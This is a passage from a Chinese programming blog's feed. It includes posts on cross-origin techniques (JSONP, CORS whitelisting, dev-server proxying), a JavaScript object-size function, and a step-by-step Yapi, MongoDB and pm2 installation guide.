class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">;(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> jsonp = <span class="function"><span class="keyword">function</span> <span class="title">jsonp</span>(<span class="params">config</span>) </span>&#123;</span><br><span class="line">    config == <span class="literal">null</span> ? (config = &#123;&#125;) : <span class="literal">null</span></span><br><span class="line">    <span class="keyword">typeof</span> config !== <span class="string">&#x27;object&#x27;</span> ? (config = &#123;&#125;) : <span class="literal">null</span></span><br><span class="line">    <span class="keyword">let</span> &#123; url, params = &#123;&#125;, jsonpName = <span class="string">&#x27;callback&#x27;</span>, success = <span class="built_in">Function</span>.prototype &#125; = config</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 自己创建一个全局函数</span></span><br><span class="line">    <span class="keyword">let</span> f_name = <span class="string">`jsonp<span class="subst">$&#123;+<span class="keyword">new</span> <span class="built_in">Date</span>()&#125;</span>`</span></span><br><span class="line">    <span class="built_in">window</span>[f_name] = <span class="function"><span class="keyword">function</span> (<span class="params">result</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">typeof</span> success === <span class="string">&#x27;function&#x27;</span> ? success(result) : <span class="literal">null</span></span><br><span class="line">      <span class="keyword">delete</span> <span class="built_in">window</span>[f_name]</span><br><span class="line">      <span class="built_in">document</span>.body.removeChild(script)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理URL</span></span><br><span class="line">    params = Qs.stringify(params)</span><br><span class="line">    <span class="keyword">if</span> (params) url += <span class="string">`<span class="subst">$&#123;url.includes(<span class="string">&#x27;?&#x27;</span>) ? <span class="string">&#x27;&amp;&#x27;</span> : <span class="string">&#x27;?&#x27;</span>&#125;</span><span class="subst">$&#123;params&#125;</span>`</span></span><br><span class="line">    url += <span class="string">`<span class="subst">$&#123;url.includes(<span class="string">&#x27;?&#x27;</span>) ? <span class="string">&#x27;&amp;&#x27;</span> : <span class="string">&#x27;?&#x27;</span>&#125;</span><span class="subst">$&#123;jsonpName&#125;</span>=<span class="subst">$&#123;f_name&#125;</span>`</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发送请求</span></span><br><span class="line">    <span class="keyword">let</span> script = <span class="built_in">document</span>.createElement(<span class="string">&#x27;script&#x27;</span>)</span><br><span class="line">    script.src = url</span><br><span class="line">    <span class="comment">// script.onerror = () =&gt; &#123;&#125;;</span></span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(script)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">window</span> !== <span class="string">&#x27;undefined&#x27;</span>) &#123;</span><br><span class="line">    <span class="built_in">window</span>.jsonp = jsonp</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><h3 id="其它网站-JSONP-案例"><a href="#其它网站-JSONP-案例" class="headerlink" title="其它网站 JSONP 案例"></a>其它网站 JSONP 案例</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  jsonp(&#123;</span><br><span class="line">    url: <span class="string">&#x27;https://www.baidu.com/sugrec&#x27;</span>,</span><br><span class="line">    params: &#123;</span><br><span class="line">      prod: <span class="string">&#x27;pc&#x27;</span>,</span><br><span class="line">      wd: <span class="string">&#x27;百度&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    jsonpName: <span class="string">&#x27;cb&#x27;</span>,</span><br><span class="line">    success: <span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(result)</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="CORS-跨域资源共享"><a href="#CORS-跨域资源共享" class="headerlink" title="CORS 跨域资源共享"></a>CORS 跨域资源共享</h2><p>在发送真实请求之前，浏览器会先发送一个试探性请求 OPTIONS（目的：测试客户端和服务器之间是否可以正常通信）如果可以正常通信，接下来再发送真实请求信息</p><h3 id="服务器代码-1"><a href="#服务器代码-1" class="headerlink" title="服务器代码"></a>服务器代码</h3><p><strong>Allow-Origin</strong> 可以设置的值</p><ul><li>单一源</li><li><code>*</code> 所有源（但是此时不安全，而且不允许携带资源凭证）</li></ul><p>假如你希望有多个源（不是所有源）都可以跨域，这时就需要<strong>设置一个白名单</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 白名单</span></span><br><span class="line"><span class="keyword">const</span> safeList = [, <span class="string">&#x27;http://127.0.0.1:5500&#x27;</span>, <span class="string">&#x27;http://127.0.0.1:5501&#x27;</span>]</span><br><span class="line">app.use(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> origin = req.headers.origin || req.headers.referer</span><br><span class="line">  origin = origin.replace(<span class="regexp">/\/$/</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  <span class="keyword">if</span> (safeList.includes(origin)) &#123;</span><br><span class="line">    res.header(<span class="string">&#x27;Access-Control-Allow-Origin&#x27;</span>, origin)</span><br><span class="line">    res.header(<span class="string">&#x27;Access-Control-Allow-Credentials&#x27;</span>, <span class="literal">true</span>)</span><br><span class="line">    req.method === <span class="string">&#x27;OPTIONS&#x27;</span> ? res.send(<span class="string">&#x27;Current Services Support Domain Request!&#x27;</span>) : next()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">app.get(<span class="string">&#x27;/test&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.send(<span class="string">&#x27;OK&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="客户端代码"><a href="#客户端代码" class="headerlink" title="客户端代码"></a>客户端代码</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  fetch(<span class="string">&#x27;http://127.0.0.1:1001/test&#x27;</span>).then(<span class="function"><span class="params">response</span> =&gt;</span> response.text()).then(<span class="function"><span class="params">data</span> =&gt;</span> <span class="built_in">console</span>.log(data))</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Proxy-跨域代理"><a href="#Proxy-跨域代理" class="headerlink" title="Proxy 跨域代理"></a>Proxy 跨域代理</h2><p>爬虫：自己写一个后台，去爬取别的后台的数据（平台和平台之间没有跨域）</p><ul><li>后台和后台之间没有跨域限制（服务器一般会做白名单）</li><li>客户端和服务器才有跨域限制（浏览器的安全性）</li></ul><p>使用 <code>webpack devServer</code> 插件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  devServer: &#123;</span><br><span class="line">    port: <span class="string">&#x27;3000&#x27;</span>,</span><br><span class="line">    compress: <span class="literal">true</span>,</span><br><span class="line">    open: <span class="literal">true</span>,</span><br><span class="line">    hot: <span class="literal">true</span>,</span><br><span class="line">    proxy: &#123;</span><br><span class="line">      <span class="string">&#x27;/&#x27;</span>: &#123;</span><br><span class="line">        target: <span class="string">&#x27;https://www.jianshu.com&#x27;</span>,</span><br><span class="line">        changeOrigin: <span class="literal">true</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="通过代理爬取简书"><a href="#通过代理爬取简书" class="headerlink" title="通过代理爬取简书"></a>通过代理爬取简书</h3><ul><li>通过 pipe 实现请求代理</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> request = <span class="built_in">require</span>(<span class="string">&#x27;request&#x27;</span>)</span><br><span class="line">app.get(<span class="string">&#x27;/subscriptions/recommended_collections&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> url = <span class="string">&#x27;https://www.jianshu.com/asimov&#x27;</span> + req.url</span><br><span class="line">  req.pipe(request(url)).pipe(res)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意：这里html文件名必须为index.html</span></span><br><span class="line">app.use(express.static(<span class="string">&#x27;./&#x27;</span>))</span><br></pre></td></tr></table></figure><ul><li>前端代码</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  fetch(<span class="string">&#x27;/subscriptions/recommended_collections&#x27;</span>).then(<span class="function"><span class="params">response</span> =&gt;</span> response.text()).then(<span class="function"><span class="params">data</span> =&gt;</span> <span class="built_in">console</span>.log(</span></span><br><span class="line">    data))</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;跨域&quot;&gt;&lt;a href=&quot;#跨域&quot; class=&quot;headerlink&quot; title=&quot;跨域&quot;&gt;&lt;/a&gt;跨域&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;非同源策略请求&lt;/strong&gt;（比较协议、域名、端口号，只要有一个不一样就是跨域）：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;页面的访问地址（Web地址）&lt;/li&gt;
&lt;li&gt;数据接口的请求地址&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="JavaScript" scheme="http://llmysnow.top/categories/JavaScript/"/>
    
    
    <category term="跨域处理" scheme="http://llmysnow.top/tags/%E8%B7%A8%E5%9F%9F%E5%A4%84%E7%90%86/"/>
    
    <category term="JSONP" scheme="http://llmysnow.top/tags/JSONP/"/>
    
    <category term="CORS" scheme="http://llmysnow.top/tags/CORS/"/>
    
    <category term="Proxy" scheme="http://llmysnow.top/tags/Proxy/"/>
    
  </entry>
  
  <entry>
    <title>JS 实现 sizeOf 函数，计算 object 占用了多少个 bytes</title>
    <link href="http://llmysnow.top/posts/9cad4e3f/"/>
    <id>http://llmysnow.top/posts/9cad4e3f/</id>
    <published>2021-08-31T02:16:08.893Z</published>
    <updated>2021-08-31T02:16:08.893Z</updated>
    
    <content type="html"><![CDATA[<h2 id="实现-sizeOf-函数，传入一个-object，计算这个-Object-占用了多少个-bytes"><a href="#实现-sizeOf-函数，传入一个-object，计算这个-Object-占用了多少个-bytes" class="headerlink" title="实现 sizeOf 函数，传入一个 object，计算这个 Object 占用了多少个 bytes"></a>实现 sizeOf 函数，传入一个 object，计算这个 Object 占用了多少个 bytes</h2><p>可以参考：<a href="https://github.com/miktam/sizeof">https://github.com/miktam/sizeof</a></p><ul><li>Number：一个数字 8 字节（64 位存储）</li><li>String：一个字符 2 字节</li><li>Boolean：4 个字节</li></ul><a id="more"></a><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> same = &#123;&#125;</span><br><span class="line"><span class="keyword">const</span> testData = &#123;</span><br><span class="line">  a: <span class="number">111</span>,</span><br><span class="line">  b: <span class="string">&#x27;ccc&#x27;</span>,</span><br><span class="line">  <span class="number">222</span>: <span class="literal">false</span>,</span><br><span class="line">  c: same,</span><br><span class="line">  d: same,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> seen = <span class="keyword">new</span> <span class="built_in">WeakSet</span>()</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sizeOfObj</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (obj === <span class="literal">null</span>) <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> bytes = <span class="number">0</span></span><br><span class="line">  <span class="comment">// 对象里的key也是占用内存空间的</span></span><br><span class="line">  <span class="keyword">const</span> props = <span class="built_in">Object</span>.keys(obj)</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; props.length; i++) &#123;</span><br><span class="line">    <span class="keyword">const</span> key = props[i]</span><br><span class="line">    <span class="comment">// 无论value是否重复，都需要计算key</span></span><br><span class="line">    bytes += calculator(key)</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> obj[key] === <span class="string">&#x27;object&#x27;</span> &amp;&amp; obj[key] !== <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="comment">// 这里需要注意value使用相同内存空间（只需计算一次内存）</span></span><br><span class="line">      <span class="keyword">if</span> (seen.has(obj[key])) <span class="keyword">continue</span></span><br><span class="line">      seen.add(obj[key])</span><br><span class="line">    &#125;</span><br><span class="line">    bytes += calculator(obj[key])</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> bytes</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">calculator</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> objType = <span class="keyword">typeof</span> obj</span><br><span class="line">  <span class="keyword">switch</span> (objType) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;string&#x27;</span>:</span><br><span class="line">      <span class="keyword">return</span> obj.length * <span class="number">2</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;boolean&#x27;</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="number">4</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;number&#x27;</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="number">8</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;object&#x27;</span>:</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">Array</span>.isArray(obj)) &#123;</span><br><span class="line">        <span class="comment">// 数组处理 [1,2] [&#123;x:1&#125;,&#123;y:2&#125;]</span></span><br><span class="line">        <span class="keyword">return</span> obj.map(calculator).reduce(<span class="function">(<span class="params">res, cur</span>) =&gt;</span> res + cur, <span class="number">0</span>)</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 对象处理</span></span><br><span class="line">        <span class="keyword">return</span> sizeOfObj(obj)</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(calculator(testData)) <span class="comment">// 32</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;实现-sizeOf-函数，传入一个-object，计算这个-Object-占用了多少个-bytes&quot;&gt;&lt;a href=&quot;#实现-sizeOf-函数，传入一个-object，计算这个-Object-占用了多少个-bytes&quot; class=&quot;headerlink&quot; title=&quot;实现 sizeOf 函数，传入一个 object，计算这个 Object 占用了多少个 bytes&quot;&gt;&lt;/a&gt;实现 sizeOf 函数，传入一个 object，计算这个 Object 占用了多少个 bytes&lt;/h2&gt;&lt;p&gt;可以参考：&lt;a href=&quot;https://github.com/miktam/sizeof&quot;&gt;https://github.com/miktam/sizeof&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Number：一个数字 8 字节（64 位存储）&lt;/li&gt;
&lt;li&gt;String：一个字符 2 字节&lt;/li&gt;
&lt;li&gt;Boolean：4 个字节&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="JavaScript" scheme="http://llmysnow.top/categories/JavaScript/"/>
    
    
    <category term="JavaScript" scheme="http://llmysnow.top/tags/JavaScript/"/>
    
    <category term="字节数" scheme="http://llmysnow.top/tags/%E5%AD%97%E8%8A%82%E6%95%B0/"/>
    
    <category term="面试题" scheme="http://llmysnow.top/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>Yapi安装部署（接口管理服务）</title>
    <link href="http://llmysnow.top/posts/bb3fd12a/"/>
    <id>http://llmysnow.top/posts/bb3fd12a/</id>
    <published>2021-08-31T02:16:08.893Z</published>
    <updated>2021-08-31T02:16:08.893Z</updated>
    
    <content type="html"><![CDATA[<p><strong><code>Yapi</code></strong> 由 <code>YMFE</code>开源，旨在为开发、产品、测试人员提供更优雅的接口管理服务，可以帮助开发者轻松创建、发布、维护<code>API</code>。</p><p>官方文档：<a href="https://hellosean1025.github.io/yapi/devops/index.html">https://hellosean1025.github.io/yapi/devops/index.html</a></p><a id="more"></a><p><img data-src="https://gitee.com/lilyn/pic/raw/master/js-img/yapi%E7%95%8C%E9%9D%A2.jpg" alt="yapi界面"></p><h2 id="环境要求"><a href="#环境要求" class="headerlink" title="环境要求"></a>环境要求</h2><ul><li>nodejs（7.6+)</li><li>mongodb（2.6+）</li></ul><p><strong>安装Node注意：</strong> 最好安装14版本之前的，推荐12版本的，不然可能Node版本过高，导致无法成功部署</p><p>下载链接：<a href="https://nodejs.org/download/release/v12.12.0/">Node v12.12.0/ (nodejs.org)</a></p><p><strong>安装MongoDB注意：</strong> 选择 Custom：自定义安装路径。安装MongDB需要取消这个勾选，不然会死等…（剩下一路next）</p><p><img data-src="https://gitee.com/lilyn/pic/raw/master/js-img/install%20mongodb.png" alt="install mongodb"></p><p>下载链接：<a href="http://dl.mongodb.org/dl/win32/x86_64">Downloads for win32 (mongodb.org)</a></p><h3 id="配置Node淘宝源"><a href="#配置Node淘宝源" class="headerlink" title="配置Node淘宝源"></a>配置Node淘宝源</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config <span class="built_in">set</span> registry https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure><h3 id="配置MongoDB"><a href="#配置MongoDB" class="headerlink" title="配置MongoDB"></a>配置MongoDB</h3><p><img data-src="https://gitee.com/lilyn/pic/raw/master/js-img/mongodb%20config.jpg" alt="mongodb config"></p><p>在安装目录创建 <code>mongodb.config</code>，填入如下信息（需要修改安装目录：我安装在：<code>D:\MongoDB</code>）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改安装目录</span></span><br><span class="line">dbpath=D:\MongoDB\data\db <span class="comment"># 数据库路径</span></span><br><span class="line"><span class="comment"># 修改安装目录</span></span><br><span class="line">logpath=D:\MongoDB\<span class="built_in">log</span>\mongod.log <span class="comment">#日志输出文件路径</span></span><br><span class="line"></span><br><span class="line">logappend=<span class="literal">true</span> <span class="comment"># 错误日志采用追加模式</span></span><br><span class="line"></span><br><span class="line">journal=<span class="literal">true</span> <span class="comment">#启用日志文件，默认启用</span></span><br><span class="line"></span><br><span class="line">quiet=<span class="literal">true</span> <span class="comment">#过滤掉无用的日志信息，若需要调试使用请设置为false</span></span><br><span class="line"></span><br><span class="line">port=27017 <span class="comment">#端口号 默认为27017</span></span><br></pre></td></tr></table></figure><ul><li>在 data 文件夹中新建文件夹 db</li><li>在 log文 件夹中新建 logs文件夹，logs文件夹新建 log.txt</li></ul><p>在MongoDB文件夹的bin目录下，启动cmd命令窗口输入如下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> D:/MongoDB</span><br><span class="line"><span class="comment"># 修改安装目录</span></span><br><span class="line">mongod --dbpath <span class="string">&quot;D:\MongoDB\data\db&quot;</span>  --logpath <span class="string">&quot;D:\MongoDB\logs\log.txt&quot;</span>  --install -serviceName <span class="string">&quot;MongoDB&quot;</span>  </span><br></pre></td></tr></table></figure><p>打开浏览器访问 <a href="http://localhost:27017/">http://localhost:27017/</a> 或者 <a href="http://127.0.0.1:27017/">http://127.0.0.1:27017/</a></p><p>显示如下信息：说明启动成功</p><p><img data-src="https://gitee.com/lilyn/pic/raw/master/js-img/mongodb%20success.jpg" alt="mongodb success"></p><ul><li>右击“我的电脑”-&gt;属性-&gt;高级系统设置-&gt;环境变量</li></ul><p><img data-src="https://gitee.com/lilyn/pic/raw/master/js-img/%E6%B7%BB%E5%8A%A0%E7%B3%BB%E7%BB%9F%E5%8F%98%E9%87%8F.jpg" alt="添加系统变量"></p><p>新增你的 MongoDB 的 bin 目录的路径-&gt;保存</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改安装目录，我的安装在D盘</span></span><br><span class="line">D:\MongoDB\bin</span><br></pre></td></tr></table></figure><ul><li>之后可以在cmd里输入mongo测试一下</li></ul><h2 id="安装yapi"><a href="#安装yapi" class="headerlink" title="安装yapi"></a>安装yapi</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm install -g yapi-cli</span><br><span class="line"><span class="comment"># 或使用淘宝源安装</span></span><br><span class="line">npm install -g yapi-cli --registry https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure><h3 id="启动yapi"><a href="#启动yapi" class="headerlink" title="启动yapi"></a>启动yapi</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动</span></span><br><span class="line">yapi server</span><br></pre></td></tr></table></figure><p>yapi server 执行后提示：在浏览器打开 <a href="http://0.0.0.0:9090/">http://0.0.0.0:9090</a> 访问。非本地服务器，请将 0.0.0.0 替换成指定的域名或你本机IP</p><p>在CMD中，可以用如下方法查询查询本机IP:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 找到无线局域网适配器 WLAN</span></span><br><span class="line">ipconfig</span><br></pre></td></tr></table></figure><ul><li>找到后，输入ip+:9090，进入网址即可，界面如下：</li></ul><p><img data-src="https://gitee.com/lilyn/pic/raw/master/js-img/yapi%E5%B9%B3%E5%8F%B0%E9%83%A8%E7%BD%B2.jpg" alt="yapi平台部署"></p><p>填写完信息后，点击开始部署。<strong>注意：</strong>需要记住这个<strong>部署路径</strong></p><p>成功部署后会显示如下：</p><p><img data-src="https://gitee.com/lilyn/pic/raw/master/js-img/%E9%83%A8%E7%BD%B2%E6%88%90%E5%8A%9F.jpg" alt="部署成功"></p><p>进入<strong>部署路径</strong>，输入如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 切换到部署路径下启动</span></span><br><span class="line">node vendors/server/app.js</span><br></pre></td></tr></table></figure><ul><li><p>内网下可以通过本机IP+端口号，进行访问，界面如图：</p><p><img data-src="https://gitee.com/lilyn/pic/raw/master/js-img/yapi%E7%95%8C%E9%9D%A2.jpg" alt="yapi界面"></p></li></ul><h3 id="pm2方式管理进程"><a href="#pm2方式管理进程" class="headerlink" title="pm2方式管理进程"></a>pm2方式管理进程</h3><p>要保证后台保持进程，需要安装pm2，进入<strong>部署路径</strong>启动即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm install -g pm2</span><br><span class="line"><span class="comment"># 切换到部署路径下启动</span></span><br><span class="line">pm2 start vendors/server/app.js --watch -i 1</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/lilyn/pic/raw/master/js-img/pm2%E5%90%AF%E5%8A%A8.jpg" alt="pm2启动"></p><p>这样以后就可以很方便的用pm2启动关闭就行了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动</span></span><br><span class="line">pm2 start vendors/server/app.js --watch -i 1</span><br><span class="line"><span class="comment"># 查看</span></span><br><span class="line">pm2 list</span><br><span class="line"><span class="comment"># 停止</span></span><br><span class="line">pm2 stop vendors/server/app.js</span><br></pre></td></tr></table></figure><p>以后访问本机IP+端口号即可进入</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;strong&gt;&lt;code&gt;Yapi&lt;/code&gt;&lt;/strong&gt; 由 &lt;code&gt;YMFE&lt;/code&gt;开源，旨在为开发、产品、测试人员提供更优雅的接口管理服务，可以帮助开发者轻松创建、发布、维护&lt;code&gt;API&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;官方文档：&lt;a href=&quot;https://hellosean1025.github.io/yapi/devops/index.html&quot;&gt;https://hellosean1025.github.io/yapi/devops/index.html&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="基础配置" scheme="http://llmysnow.top/categories/%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE/"/>
    
    
    <category term="Yapi" scheme="http://llmysnow.top/tags/Yapi/"/>
    
    <category term="接口服务" scheme="http://llmysnow.top/tags/%E6%8E%A5%E5%8F%A3%E6%9C%8D%E5%8A%A1/"/>
    
    <category term="环境部署" scheme="http://llmysnow.top/tags/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"/>
    
    <category term="pm2" scheme="http://llmysnow.top/tags/pm2/"/>
    
  </entry>
  
  <entry>
    <title>动态路由（前端后端控制）</title>
    <link href="http://llmysnow.top/posts/ff471169/"/>
    <id>http://llmysnow.top/posts/ff471169/</id>
    <published>2021-08-31T02:16:08.893Z</published>
    <updated>2021-08-31T02:16:08.894Z</updated>
    
